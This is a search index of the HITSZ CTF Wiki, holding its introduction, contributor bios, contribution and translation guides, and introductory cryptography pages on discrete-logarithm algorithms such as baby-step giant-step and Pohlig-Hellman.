{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Introduction","text":"<p>Welcome to CTF Wiki\uff01</p> <p>CTF (Capture The Flag) started from DEFCON CTF, a competitive game among computer security enthusiasts, originally hosted in 1996.</p> <p>CTF covers a wide range of fields. Along with the evolving security technology, the difficulty of CTF challenges is getting harder and harder. As a result, the learning curve for beginners is getting steeper. Most online information is scattered and trivial. Beginners often don't know how to systematically learn CTF, which requires a lot of work and effort.</p> <p>In order to let those people who are interested in CTFs start easily, in October 2016, CTF Wiki was established on Github. Along with gradually improved content over time, CTF Wiki has received lots of appreciation from security enthusiasts, many of those are guys that we think we would never meet.</p> <p>As a freedom site, primarily focusing on recent CTFs, CTF Wiki introduces the knowledge and techniques in all aspects of CTF to make it easier for beginners to learn CTF.</p> <p>Now, CTF Wiki mainly contains the basic skills for CTF, but we are working hard to improve the following contents.</p> <ul> <li>Advanced skills used in CTF</li> <li>Special topics appearing in CTF</li> </ul> <p>For the above-mentioned parts to be improved, please refer to Projects which details what are planned.</p> <p>Although now CTF Wiki mainly focus CTF, it is not strictly limited to CTF topics. In the future, CTF Wiki will include</p> <ul> <li>Tools used in security research</li> <li>Increased discussion of security in the world</li> </ul> <p>In addition, given the following two points</p> <ul> <li>Information about technology should be openly shared.</li> <li>As new techniques are always being developed, old techniques will start to fade over time and they should be replaced with new techniques.</li> </ul> <p>Therefore, CTF Wiki will never publish books.</p> <p>Finally, originating from the community, as an independent organization, CTF Wiki advocates freedom of knowledge, will never be commercialized, and will always maintain the character of independence and freedom.</p>"},{"location":"#material-color-palette-theme","title":"Material Color Palette Theme","text":""},{"location":"#color-scheme","title":"Color Scheme","text":"<p>The light mode and dark mode automatically changes depends on yor browser or system settings, or you could manually change it.</p> <code>Default</code> <code>Slate</code>"},{"location":"#primary-colors","title":"Primary colors","text":"<p>Click on the color block to change the main color of the theme.</p> <code>Red</code> <code>Pink</code> <code>Purple</code> <code>Deep Purple</code> <code>Indigo</code> <code>Blue</code> <code>Light Blue</code> <code>Cyan</code> <code>Teal</code> <code>Green</code> <code>Light Green</code> <code>Lime</code> <code>Yellow</code> <code>Amber</code> <code>Orange</code> <code>Deep Orange</code> <code>Brown</code> <code>Grey</code> <code>Blue Grey</code> <code>White</code>"},{"location":"#accent-colors","title":"Accent colors","text":"<p>Click on the color block to change the auxiliary color of the theme.</p> <code>Red</code> <code>Pink</code> <code>Purple</code> <code>Deep Purple</code> <code>Indigo</code> <code>Blue</code> <code>Light Blue</code> <code>Cyan</code> <code>Teal</code> <code>Green</code> <code>Light Green</code> <code>Lime</code> <code>Yellow</code> <code>Amber</code> <code>Orange</code> <code>Deep Orange</code>"},{"location":"contribute/","title":"\u8d21\u732e\u6307\u5357","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5982\u679c\u60a8\u60f3\u52a0\u5165\u6211\u4eec\uff0c\u4e3a HITSZ CTF Wiki \u589e\u52a0\u5185\u5bb9\uff0c\u8bf7\u52a0\u5165\u6211\u4eec\u7684 QQ \u7fa4\u3002 </p>"},{"location":"contributer/","title":"\u8d21\u732e\u8005","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"contributer/#271","title":"271","text":"<p>2018\u7ea7\u8ba1\u7b97\u673a\u7cfb\uff0c\u8f6f\u4ef6\u5b89\u5168\u7231\u597d\u8005\uff0c\u76ee\u524d\u7814\u7a76\u56fa\u4ef6fuzzing\u3002\u4e00\u53eaPwn\u83dc\u9e21</p>"},{"location":"contributer/#_2","title":"\u674e\u4e50\u822a","text":"<p>2018\u7ea7\u8ba1\u7b97\u673a\u7cfb\uff0c\u7231\u597d\u6570\u5b66\uff0c\u4e3b\u8981\u7814\u7a76 Crypto \u65b9\u5411\u3002</p>"},{"location":"contributer/#_3","title":"\u5218\u4e00\u8fb0","text":"<p>2019\u7ea7\u8ba1\u7b97\u673a\u7cfb\uff0c\u4e3b\u8981\u7814\u7a76 misc \u53ca reverse \u65b9\u5411\uff0c\u5bf9\u5404\u79cd\u5f62\u5f0f\u7684\u9690\u5199\u53ca\u8f6f\u4ef6\u5f00\u53d1\u62b1\u6709\u8f83\u5927\u7814\u7a76\u70ed\u60c5\u3002</p>"},{"location":"contributer/#_4","title":"\u5f90\u5f00\u8c6a","text":"<p>2019\u7ea7\u8ba1\u7b97\u673a\u7cfb\uff0cweb</p>"},{"location":"contributer/#_5","title":"\u6768\u5927\u8363","text":"<p>20\u7ea7\u8ba1\u7b97\u673a\u7cfb \u4fe1\u606f\u5b89\u5168\u7231\u597d\u8005 \u4e8c\u8fdb\u5236\u840c\u65b0 \u64c5\u957f\u6bd4\u8d5b\u6478\u9c7c \u73b0\u5728\u4e3b\u8981\u7814\u7a76PWN\u65b9\u5411</p>"},{"location":"contributer/#_6","title":"\u4f55\u5c71","text":"<p>2020\u7ea7\u8ba1\u7b97\u673a\u7cfb\uff0c\u5bf9web\u5f00\u53d1\u611f\u5174\u8da3\uff0c\u4fe1\u606f\u7ade\u8d5b\u4e2d\u4e3b\u8981\u5b66\u4e60web\u548cmisc\u65b9\u5411</p>"},{"location":"contributer/#_7","title":"\u5eb7\u7426\u6d69","text":"<p>2020\u7ea7\u8ba1\u7b97\u673a\u7cfb \u68a6\u60f3\u62b1\u961f\u53cb\u5927\u817f\u7684\u9006\u5411\u83dc\u9e1f\uff0c\u76ee\u524d\u8fd8\u5728\u95e8\u69db\u5916\u6323\u624e</p>"},{"location":"contributer/#_8","title":"\u6797\u9880\u806a","text":"<p>20\u7ea7\u8ba1\u7b97\u673a\u7cfb \u7231\u597d\u4fe1\u606f\u5b89\u5168 \u4e3b\u8981\u5b66\u4e60pwn \u559c\u6b22\u62a2\u7b7e\u5230\u9898\uff08</p>"},{"location":"discussion/","title":"Discussion","text":"<p>If you have any question, feel free to choose Github Discussion or Slack to communicate with us.</p>"},{"location":"contribute/basic-contribute-approach/","title":"Basic Contribute Approach","text":"<p>If you're familiar with contributing a Github Project, You can directly jump to next section. Otherwise, please take a look at https://akrabat.com/the-beginners-guide-to-contributing-to-a-github-project/.</p>"},{"location":"contribute/before-contributing/","title":"Before Contributing","text":"<p>You don't have to become a sophisticated CTFer before contributing to CTF Wiki. If you are enthusiastic about open source, and you enjoy sharing your piece of knowledge on CTF Wiki, please don't hesitate to join us.</p> <p>When you maintain CTF Wiki, no one will assign tasks to you. Feel free to commit when you find something imperfect.</p> <p>If you find that somewhere is not well-written, you can discuss with the authors and make it a more reasonable structure.</p> <p>Be sure to go over this guide before contributing.</p>"},{"location":"contribute/documentation-requirement/","title":"Document Requirements","text":"<p>When you intend to contribute something, you should assure</p> <ul> <li>Content format</li> <li>Content structure</li> <li>File name and file path</li> </ul> <p>meet the following requirements.</p>"},{"location":"contribute/documentation-requirement/#content-format","title":"Content format","text":"<p>Note</p> <p>For the basic content format, it is needed to be discussed.</p> <p>Some other requirements</p> <ul> <li>In the future, we may consider to automatically generate a sequence number for every paragraph title, so we recommend no sequence number for paragraph titles.</li> <li>As the challenges mentioned in the doc are placed in the <code>ctf-challenge</code> repository in order, we don't need to include a link to the challenge in the documentation. Moreover, every time the challenge's location in the repository changes, the challenge link also changes. Therefore, fixing the challenge link is a time-consuming and annoying task.</li> </ul>"},{"location":"contribute/documentation-requirement/#content-structure","title":"Content structure","text":"<p>The content must have the following characteristics</p> <ul> <li>From easy to hard, the difficulty of content should be gradual.</li> <li>Logical, every part should contain the following items</li> <li>Principle, explaining the principle corresponding to this content.</li> <li>Examples, give 1 to 2 typical examples.</li> <li>Exercises, give 1 to 2 typical exercises.</li> </ul>"},{"location":"contribute/documentation-requirement/#file-name-and-file-path","title":"File name and file path","text":"<p>Document should be stored in the appropriate directory.</p> <ul> <li>Figure. Please note that the image should be placed in a local folder. We should avoid referencing image from other websites. We recommend using a relative path <code>./figure</code> to reference the image.</li> <li>File names must be lowercase, separated by <code>-</code>, e.g. <code>file-name</code>.</li> <li>Regardless of the example or the exercise, the corresponding attachments should be stored in the corresponding directory in the <code>ctf-challenge</code> repository.</li> </ul>"},{"location":"contribute/translation/","title":"Translation","text":"<p>Currently, multi-language support mainly draws on the processing method of fastapi. It should be noted that during the translation process, we only need to ensure that the different languages \u200b\u200bare consistent at the file level. Regarding the specific content of the document, you don't need to be too restrictive, just express the same meaning.</p>"},{"location":"contribute/translation/#improve-existing-language","title":"Improve existing language","text":"<p>Here we take English as an example.</p> <p>First, we need to determine the two-letter code corresponding to English. By querying https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes, we can know that the corresponding code is <code>en</code>.</p> <p>After confirming the code, we can know the directory where the documentation of the language is located, namely <code>docs/en</code>.</p> <p>Suppose the document we want to translate is <code>docs/zh/docs/contribute/translation.md</code>. Then, we can copy the file to <code>docs/en/docs/contribute/translation.md</code>. At the same time, if the file depends on figures, we also need to copy the corresponding figure folder to the corresponding directory.</p> <p>Then, we can open the Chinese corresponding mkdocs.yml, namely <code>docs/zh/docs/mkdocs.yml</code>, and find the location of the file we want to translate, such as</p> <p><pre><code>nav:\n- Start:\n- index.md\n- discussion.md\n- contribute/before-contributing.md\n- contribute/basic-contribute-approach.md\n- contribute/documentation-requirement.md\n- contribute/translation.md\n</code></pre> Then we should add the corresponding file at the corresponding hierarchical structure in the English configuration file.</p> <pre><code>nav:\n- Start:\n- index.md\n- discussion.md\n- contribute/before-contributing.md\n- contribute/basic-contribute-approach.md\n- contribute/documentation-requirement.md\n- contribute/translation.md\n</code></pre> <p>Then, we can translate it.</p> <p>Finally, we can use <code>python3 scripts/doc.py live en</code> to preview the modified content.</p>"},{"location":"contribute/translation/#add-new-language","title":"Add New language","text":"<p>If you plan to add a language that has not yet undergone any translation, such as Japanese (<code>jp</code>), you can use</p> <pre><code>python3 scripts/doc.py new-lang jp\n</code></pre> <p>To initialize. After that, you can contribute as in the previous section.</p>"},{"location":"crypto/introduction/","title":"\u5bc6\u7801\u5b66\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5bc6\u7801\u5b66\uff08Cryptography\uff09\u4e00\u822c\u53ef\u5206\u4e3a\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u3002</p> <p>\u5176\u4e2d\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u7528\u6027\u827a\u672f\u5b58\u5728\uff0c\u5176\u7f16\u7801\u548c\u7834\u8bd1\u901a\u5e38\u4f9d\u8d56\u4e8e\u8bbe\u8ba1\u8005\u548c\u654c\u624b\u7684\u521b\u9020\u529b\u4e0e\u6280\u5de7\uff0c\u5e76\u6ca1\u6709\u5bf9\u5bc6\u7801\u5b66\u539f\u4ef6\u8fdb\u884c\u6e05\u6670\u7684\u5b9a\u4e49\u3002\u53e4\u5178\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p> <ul> <li>\u5355\u8868\u66ff\u6362\u52a0\u5bc6\uff08Monoalphabetic Cipher\uff09</li> <li>\u591a\u8868\u66ff\u6362\u52a0\u5bc6\uff08Polyalphabetic Cipher\uff09</li> <li>\u5947\u5947\u602a\u602a\u7684\u52a0\u5bc6\u65b9\u5f0f</li> </ul> <p>\u800c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5219\u8d77\u6e90\u4e8e 20 \u4e16\u7eaa\u4e2d\u540e\u671f\u51fa\u73b0\u7684\u5927\u91cf\u76f8\u5173\u7406\u8bba\uff0c1949 \u5e74\u9999\u519c\uff08C. E. Shannon\uff09\u53d1\u8868\u4e86\u9898\u4e3a\u300a\u4fdd\u5bc6\u7cfb\u7edf\u7684\u901a\u4fe1\u7406\u8bba\u300b\u7684\u7ecf\u5178\u8bba\u6587\u6807\u5fd7\u7740\u73b0\u4ee3\u5bc6\u7801\u5b66\u7684\u5f00\u59cb\u3002\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p> <ul> <li>\u5bf9\u79f0\u52a0\u5bc6\uff08Symmetric Cryptography\uff09\uff0c\u4ee5 DES\uff0cAES\uff0cRC4 \u4e3a\u4ee3\u8868\u3002</li> <li>\u975e\u5bf9\u79f0\u52a0\u5bc6\uff08Asymmetric Cryptography\uff09\uff0c\u4ee5 RSA\uff0cElGamal\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u4e3a\u4ee3\u8868\u3002</li> <li>\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\uff0c\u4ee5 MD5\uff0cSHA-1\uff0cSHA-512 \u7b49\u4e3a\u4ee3\u8868\u3002</li> <li>\u6570\u5b57\u7b7e\u540d\uff08Digital Signature\uff09\uff0c\u4ee5 RSA \u7b7e\u540d\uff0cElGamal \u7b7e\u540d\uff0cDSA \u7b7e\u540d\u4e3a\u4ee3\u8868\u3002</li> </ul> <p>\u5176\u4e2d\uff0c\u5bf9\u79f0\u52a0\u5bc6\u4f53\u5236\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>\u5206\u7ec4\u5bc6\u7801\uff08Block Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u5757\u5bc6\u7801\u3002</li> <li>\u5e8f\u5217\u5bc6\u7801\uff08Stream Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u6d41\u5bc6\u7801\u3002</li> </ul> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u8bbe\u8ba1\u8005\u7684\u6839\u672c\u76ee\u6807\u662f\u4fdd\u969c\u4fe1\u606f\u53ca\u4fe1\u606f\u7cfb\u7edf\u7684</p> <ul> <li>\u673a\u5bc6\u6027\uff08Confidentiality\uff09</li> <li>\u5b8c\u6574\u6027\uff08Integrity\uff09</li> <li>\u53ef\u7528\u6027\uff08Availability\uff09</li> <li>\u8ba4\u8bc1\u6027\uff08Authentication\uff09</li> <li>\u4e0d\u53ef\u5426\u8ba4\u6027\uff08Non-repudiation\uff09</li> </ul> <p>\u5176\u4e2d\uff0c\u524d\u4e09\u8005\u88ab\u79f0\u4e3a\u4fe1\u606f\u5b89\u5168\u7684 CIA \u4e09\u8981\u7d20 \u3002</p> <p>\u800c\u5bf9\u4e8e\u5bc6\u7801\u7834\u89e3\u8005\u6765\u8bf4\uff0c\u4e00\u822c\u662f\u8981\u60f3\u529e\u6cd5\u8bc6\u522b\u51fa\u5bc6\u7801\u7b97\u6cd5\uff0c\u7136\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u6216\u8005\u5229\u7528\u5bc6\u7801\u4f53\u5236\u7684\u6f0f\u6d1e\u8fdb\u884c\u7834\u89e3\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u865a\u5047\u7684\u54c8\u5e0c\u503c\u6216\u8005\u6570\u5b57\u7b7e\u540d\u6765\u7ed5\u8fc7\u76f8\u5e94\u7684\u68c0\u6d4b\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u5df2\u77e5\u5f85\u7834\u89e3\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u800c\u653b\u51fb\u7c7b\u578b\u901a\u5e38\u5206\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a</p> \u653b\u51fb\u7c7b\u578b \u8bf4\u660e \u552f\u5bc6\u6587\u653b\u51fb \u53ea\u62e5\u6709\u5bc6\u6587 \u5df2\u77e5\u660e\u6587\u653b\u51fb \u62e5\u6709\u5bc6\u6587\u4e0e\u5bf9\u5e94\u7684\u660e\u6587 \u9009\u62e9\u660e\u6587\u653b\u51fb \u62e5\u6709\u52a0\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u660e\u6587\u52a0\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u5bc6\u6587 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u62e5\u6709\u89e3\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u5bc6\u6587\u89e3\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u660e\u6587 <p>Note</p> <p>\u6ce8\uff1a\u4e4b\u524d\u5728\u8fd9\u91cc\u66fe\u5199\u8fc7\u8fd9\u4e9b\u653b\u51fb\u5e38\u89c1\u7684\u573a\u666f\uff0c\u968f\u7740\u4e0d\u65ad\u5730\u5b66\u4e60\uff0c\u6e10\u6e10\u610f\u8bc6\u5230\u8fd9\u4e9b\u653b\u51fb\u7c7b\u578b\u4fa7\u91cd\u63cf\u8ff0\u653b\u51fb\u8005\u7684\u80fd\u529b\uff0c\u6709\u53ef\u80fd\u9002\u7528\u4e8e\u5404\u79cd\u5404\u6837\u7684\u573a\u666f\u3002\u6545\u8fdb\u884c\u4fee\u6b63\u3002</p> <p>\u8fd9\u91cc\u63a8\u8350\u4e00\u4e9b\u8d44\u6599</p> <ul> <li>\u53ef\u6c57\u5b66\u9662\u516c\u5f00\u8bfe</li> <li>\u6df1\u5165\u6d45\u51fa\u5bc6\u7801\u5b66\u2014\u2014\u5e38\u7528\u52a0\u5bc6\u6280\u672f\u539f\u7406\u4e0e\u5e94\u7528</li> <li>https://cryptopals.com/\uff0c\u4e00\u5806\u5bc6\u7801\u5b66\u7684\u7ec3\u4e60\u9898\u76ee\u3002</li> </ul> <p>Note</p> <p>\u63a8\u8350\u5728\u770b\u5b8c\u516c\u5f00\u8bfe\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5\u53ca\u7b80\u5355\u770b\u770b\u7535\u5b50\u4e66\u7684\u60c5\u51b5\u4e0b\u5728\u8003\u8651\u662f\u5426\u8981\u8d2d\u4e70\u4e66\uff0c\u56e0\u4e3a\u4e66\u4e70\u56de\u6765\u4e00\u822c\u90fd\u88ab\u95f2\u7f6e\u8d77\u6765\u4e86\u3002</p>"},{"location":"crypto/introduction/#_2","title":"\u53c2\u8003","text":"<ul> <li>\u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66</li> </ul> <p>Info</p> <p>\u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002</p>"},{"location":"crypto/asymmetric/introduction/","title":"\u4ecb\u7ecd","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5728\u975e\u5bf9\u79f0\u5bc6\u7801\u4e2d\uff0c\u52a0\u5bc6\u8005\u4e0e\u89e3\u5bc6\u8005\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u5e76\u4e0d\u4e00\u6837\uff0c\u5178\u578b\u7684\u6709 RSA \u52a0\u5bc6\uff0c\u80cc\u5305\u52a0\u5bc6\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/","title":"\u79bb\u6563\u5bf9\u6570","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_2","title":"\u57fa\u672c\u5b9a\u4e49","text":"<p>\u5728\u4e86\u89e3\u79bb\u6563\u5bf9\u6570\u65f6\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u51e0\u4e2a\u57fa\u672c\u5b9a\u4e49\u3002</p> <p>\u5b9a\u4e491</p> <p>\u5728\u7fa4 G \u4e2d\uff0cg \u4e3a G \u7684\u751f\u6210\u5143\uff0c\u4e5f\u5c31\u662f\u8bf4\u7fa4 G \u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u53ef\u4ee5\u5199\u6210 y=g^k\uff0c\u6211\u4eec\u79f0 k \u4e3a y \u5728\u7fa4 G \u4e2d\u7684\u5bf9\u6570\u3002</p> <p>\u5b9a\u4e492</p> <p>\u8bbe m\\geq 1\uff0c(a,m)=1 \uff0c\u4f7f\u5f97 a^d \\equiv 1\\pmod m \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \u79f0\u4e3a a \u5bf9\u6a21 m \u7684\u6307\u6570\u6216\u8005\u9636\uff0c\u6211\u4eec\u4e00\u822c\u5c06\u5176\u8bb0\u4e3a \\delta_m(a)\u3002</p> <p>\u5b9a\u4e493</p> <p>\u5f53 \\delta_m(a)=\\varphi(m) \u65f6\uff0c\u79f0 a \u662f\u6a21 m \u7684\u539f\u6839\uff0c\u7b80\u79f0 m \u7684\u539f\u6839\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_3","title":"\u4e00\u4e9b\u6027\u8d28","text":"<p>\u6027\u8d281</p> <p>\u4f7f\u5f97 a^d \\equiv 1\\pmod m \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \uff0c\u5fc5\u6709d\\mid\\varphi(m)\u3002</p> <p>\u6027\u8d282</p> <p>\u6a21 m \u5269\u4f59\u7cfb\u5b58\u5728\u539f\u6839\u7684\u5145\u8981\u6761\u4ef6\u662f m=2,4,p^{\\alpha},2p^{\\alpha} \uff0c\u5176\u4e2d p \u4e3a\u5947\u7d20\u6570\uff0c \\alpha \u4e3a\u6b63\u6574\u6570\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_4","title":"\u79bb\u6563\u5bf9\u6570\u95ee\u9898","text":"<p>\u5df2\u77e5 g,p,y \uff0c\u5bf9\u4e8e\u65b9\u7a0b y\\equiv g^x \\pmod p \uff0c\u6c42\u89e3 x \u662f\u4e00\u4e2a\u96be\u89e3\u95ee\u9898\u3002\u4f46\u662f\u5f53 p \u5177\u6709\u4e00\u5b9a\u7684\u7279\u6027\u65f6\u5c31\u53ef\u80fd\u53ef\u4ee5\u6c42\u89e3\uff0c\u6bd4\u5982\uff0c\u8fd9\u4e2a\u7fa4\u7684\u9636\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\u3002</p> <p>\u6b63\u662f\u4e0a\u8ff0\u8fd9\u4e2a\u95ee\u9898\u6784\u6210\u4e86\u76ee\u524d\u5f88\u5927\u4e00\u90e8\u5206\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5305\u62ec Diffie\u2013Hellman \u5bc6\u94a5\u4ea4\u6362\uff0c ElGamal \u7b97\u6cd5\uff0cECC \u7b49\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_5","title":"\u79bb\u6563\u5bf9\u6570\u6c42\u89e3\u65b9\u5f0f","text":""},{"location":"crypto/asymmetric/discrete-log/discrete-log/#_6","title":"\u66b4\u529b\u7834\u89e3","text":"<p>\u7ed9\u5b9a y\\equiv g^x \\pmod p\uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e x \u4ece\u800c\u5f97\u5230\u771f\u6b63\u7684 x \u7684\u503c\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#baby-step-giant-step","title":"Baby-step giant-step","text":"<p>\u8fd9\u4e00\u65b9\u6cd5\u901a\u5e38\u88ab\u79f0\u4e3a\u5c0f\u6b65\u5927\u6b65\u6cd5\uff0c\u8fd9\u4e00\u65b9\u6cd5\u4f7f\u7528\u4e86\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7684\u601d\u60f3\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4ee4 x=im+j\uff0c\u5176\u4e2d m= \\lceil \\sqrt n\\rceil \uff0c\u90a3\u4e48\u6574\u6570 i \u548c j \u90fd\u5728 0 \u5230 m \u7684\u8303\u56f4\u5185\u3002</p> <p>\u56e0\u6b64</p> y=g^x=g^{im+j} <p>\u4e5f\u5c31\u662f</p> y(g^{-m})^i=g^j <p>\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 j \u5e76\u8fdb\u884c\u8ba1\u7b97\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230\u4e00\u4e2a\u96c6\u5408 S \u4e2d\uff0c\u7136\u540e\u6211\u4eec\u518d\u6b21\u679a\u4e3e i\uff0c\u8ba1\u7b97 y(g^{-m})^i\uff0c\u4e00\u65e6\u6211\u4eec\u53d1\u73b0\u8ba1\u7b97\u7684\u7ed3\u679c\u5728\u96c6\u5408 S \u4e2d\uff0c\u5219\u8bf4\u660e\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u78b0\u649e\uff0c\u8fdb\u800c\u5f97\u5230\u4e86 i \u548c j\u3002</p> <p>\u8fd9\u663e\u7136\u662f\u4e00\u4e2a\u65f6\u95f4\u4e0e\u7a7a\u95f4\u7684\u6298\u4e2d\u7684\u65b9\u5f0f\uff0c\u6211\u4eec\u5c06\u4e00\u4e2a O(n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0cO(1) \u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u8f6c\u6362\u4e3a\u4e86\u4e00\u4e2aO(\\sqrt n)\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548cO(\\sqrt n) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u3002</p> <p>\u5176\u4e2d</p> <ul> <li>\u6bcf\u4e00\u6b21 j \u7684\u589e\u52a0\u8868\u793a\u201cbaby-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g\u3002</li> <li>\u6bcf\u4e00\u6b21 i \u7684\u589e\u52a0\u8868\u793a\u201cgiant-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g^{-m} \u3002</li> </ul> <pre><code>def bsgs(g, y, p):\n    m = int(ceil(sqrt(p - 1)))\n    S = {pow(g, j, p): j for j in range(m)}\n    gs = pow(g, p - 1 - m, p)\n    for i in range(m):\n        if y in S:\n            return i * m + S[y]\n        y = y * gs % p\n    return None\n</code></pre>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-algorithm","title":"Pollard\u2019s \u03c1 algorithm","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4ee5O(\\sqrt n)\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548cO(1) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u6765\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pollards-kangaroo-algorithm","title":"Pollard\u2019s kangaroo algorithm","text":"<p>\u5982\u679c\u6211\u4eec\u77e5\u9053 x \u7684\u8303\u56f4\u4e3a a \\leq x \\leq b\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ee5O(\\sqrt{b-a}) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002</p>"},{"location":"crypto/asymmetric/discrete-log/discrete-log/#pohlig-hellman-algorithm","title":"Pohlig-Hellman algorithm","text":"<p>\u4e0d\u59a8\u5047\u8bbe\u4e0a\u8ff0\u6240\u63d0\u5230\u7684\u7fa4\u5173\u4e8e\u5143\u7d20 g \u7684\u9636\u4e3a n\uff0c n \u4e3a\u4e00\u4e2a\u5149\u6ed1\u6570\uff1a n=\\prod\\limits_{i=1}^r p_i^{e_i}\u3002</p> <ol> <li>\u5bf9\u4e8e\u6bcf\u4e2a i \\in \\{1,\\ldots,r\\} \uff1a<ol> <li>\u8ba1\u7b97 g_i \\equiv g^{n/p_i^{e_i}} \\pmod m\u3002\u6839\u636e\u62c9\u683c\u6717\u65e5\u5b9a\u7406\uff0c g_i \u5728\u7fa4\u4e2d\u7684\u9636\u4e3a p_i^{e_i} \u3002</li> <li>\u8ba1\u7b97 y_i \\equiv y^{n/p_i^{e_i}} \\equiv g^{xn/p_i^{e_i}} \\equiv g_i^{x} \\equiv g_i^{x \\bmod p_i^{e_i}} \\equiv g_i^{x_i} \\pmod m\uff0c\u8fd9\u91cc\u6211\u4eec\u77e5\u9053 y_i,m,g_i\uff0c\u800cx_i \u7684\u8303\u56f4\u4e3a[0,p_i^{e_i})\uff0c\u7531 n \u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u53ef\u77e5\u5176\u8303\u56f4\u8f83\u5c0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Pollard\u2019s kangaroo algorithm \u7b49\u65b9\u6cd5\u5feb\u901f\u6c42\u5f97x_i\u3002</li> </ol> </li> <li>\u6839\u636e\u4e0a\u8ff0\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5bf9\u4e8e i \\in \\{1,\\ldots,r\\} \uff0cx \\equiv x_i \\pmod{p_i^{e_i}} \uff0c\u8be5\u5f0f\u53ef\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002</li> </ol> 